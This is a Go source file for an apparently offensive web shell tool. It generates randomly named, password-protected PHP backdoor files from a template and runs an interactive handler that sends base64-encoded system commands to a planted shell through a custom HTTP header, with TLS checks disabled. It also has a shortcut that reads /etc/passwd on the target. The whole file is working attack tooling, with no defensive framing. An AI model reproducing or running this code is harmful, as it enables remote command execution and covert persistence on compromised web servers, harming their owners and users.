package main

import (
	"bufio"
	"crypto/tls"
	"encoding/base64"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strings"
	"text/template"
	"time"
)

type Rand struct {
	RandVar  string
	RandPass string
}

func RandString(n int) string {
	rand.Seed(time.Now().UnixNano())
	const alphanum = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	var bytes = make([]byte, n)
	rand.Read(bytes)
	for i, b := range bytes {
		bytes[i] = alphanum[b%byte(len(alphanum))]
	}
	return string(bytes)
}

func GetHostname(address string) string {
	url, err := url.Parse(address)
	if err != nil {
		log.Fatalf("Invalid url %v", err)
	}
	hostname := strings.TrimPrefix(url.Hostname(), "www.")

	return hostname
}

func Requester(url string, cmd string, password string) string {
	var bases = []rune{'T', 'w', 'F', 'v', 'Z', 'n'}

	payload := fmt.Sprintf("%s%s", string(bases[rand.Intn(len(bases))]),
		base64.StdEncoding.EncodeToString([]byte(fmt.Sprintf("system~%s", cmd))))

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}

	req, _ := http.NewRequest("GET", url, nil)

	req.Header = http.Header{
		"Host":       {GetHostname(url)},
		"User-Agent": {""},
		password:     {payload},
	}

	resp, err := client.Do(req)
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()

	bodyText, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatal(err)
	}
	if string(bodyText[:5]) == "Array" {
		bodyText = bodyText[5:]
	}
	return string(bodyText)
}

func checkCustom(cmd string) string {
	if cmd == ":\n" || cmd == ":exit\n" {
		os.Exit(0)
	} else if cmd == ":cls\n" || cmd == ":clear\n" {
		fmt.Printf("\x1bc")
		cmd = ""
	} else if cmd == ":passwd\n" {
		cmd = "cat /etc/passwd"
	}
	return cmd
}

func main() {
	t := flag.String("t", "templates/ninja.webshell", "a string")
	handler := flag.String("handler", "", "a string")
	gen := flag.Bool("gen", false, "a boolean")
	raw := flag.Bool("raw", false, "a boolean")
	flag.Parse()

	if *handler != "" {
		var password string
		fmt.Printf("🔑 Password > ")
		fmt.Scan(&password)

		for {
			fmt.Printf("🥷 > ")
			in := bufio.NewReader(os.Stdin)
			cmd, _ := in.ReadString('\n')
			cmd = checkCustom(cmd)
			if cmd != "" {
				resp := Requester(*handler, cmd, password)
				println(resp)
			}
		}
	}

	if *gen {
		template, err := template.ParseFiles(*t)
		if err != nil {
			log.Fatalln(err)
		}
		data := Rand{RandVar: RandString(10), RandPass: RandString(20)}
		if *raw {
			template.Execute(os.Stdout, data)
			os.Exit(0)
		}
		fmt.Printf("🔑 Password > %s \n", data.RandPass)

		f, err := os.Create(fmt.Sprintf("%s.php", data.RandVar))
		if err != nil {
			log.Fatal(err)
		}
		defer f.Close()
		template.Execute(f, data)
	}
}
